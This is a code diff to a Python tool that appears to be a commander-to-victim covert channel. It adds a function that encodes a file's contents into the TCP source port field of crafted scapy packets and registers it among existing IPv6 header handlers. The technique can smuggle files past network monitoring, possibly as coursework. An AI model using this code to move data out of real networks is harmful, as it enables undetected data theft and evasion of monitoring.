@@ -1473,6 +1473,65 @@ def transfer_file_ipv6_dest_addr(client_sock: socket.socket,
     print(constants.IPV6_DESTINATION_FIELD_ERROR)
 
 
+# ===================== IPV6 INSERT COVERT DATA FUNCTIONS =====================
+
+
+def transfer_file_tcp_src_port(client_sock: socket.socket,
+                               dest_ip: str,
+                               dest_port: int,
+                               src_port: int,
+                               file_path: str):
+    """
+    Hides file data covertly in TCP headers using the
+    source port field.
+
+    @note Bit length
+        The source port field for TCP headers is 16 bits (2 Bytes)
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param dest_port:
+        A string representing the destination port
+
+    @param src_port:
+        A string representing the commander's port
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 16):
+        binary_segment = binary_data[i:i + 16].ljust(16, '0')
+        new_src_port = int(binary_segment, 2)
+        packet = IP(dst=dest_ip) / TCP(sport=new_src_port, dport=dest_port)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
 def __get_protocol_header_function_map():
     return {  # A tuple of [Header, Field] => Function
         # a) IPv4 Handlers
@@ -1501,7 +1560,7 @@ def __get_protocol_header_function_map():
         ("IPv6", "Destination Address"): transfer_file_ipv6_dest_addr,
 
         # c) TCP Handlers
-        ("TCP", "Source Port"): "F()",
+        ("TCP", "Source Port"): transfer_file_tcp_src_port,
         ("TCP", "Destination Port"): "F()",
         ("TCP", "Sequence Number"): "F()",
         ("TCP", "Acknowledgement Number"): "F()",
@@ -1574,6 +1633,10 @@ def transfer_file_covert(sock: socket.socket, dest_ip: str, dest_port: int,
                     # Get victim IPv6 address and port
                     dest_ip, dest_port = __get_target_ipv6_address(sock, dest_ip, dest_port)
                     selected_function(sock, dest_ip, dest_port, file_path)
+
+                # TCP Handlers
+                elif constants.TCP in choices:
+                    selected_function(sock, dest_ip, dest_port, source_port, file_path)
 
                 else:
                     print(constants.CALL_MAP_FUNCTION_ERROR)
